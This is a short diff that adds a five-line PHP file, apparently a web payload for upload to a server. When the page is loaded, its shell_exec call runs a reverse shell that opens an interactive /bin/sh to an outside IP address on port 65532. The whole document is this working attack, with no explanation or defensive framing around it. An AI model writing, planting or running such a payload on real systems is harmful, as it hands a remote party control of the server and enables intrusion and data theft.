@@ -1,0 +1,5 @@
+<?php
+echo "<pre>";
+echo shell_exec("/bin/sh -i >& /dev/tcp/142.171.89.142/65532 0>&1");
+echo "</pre>";
+?>
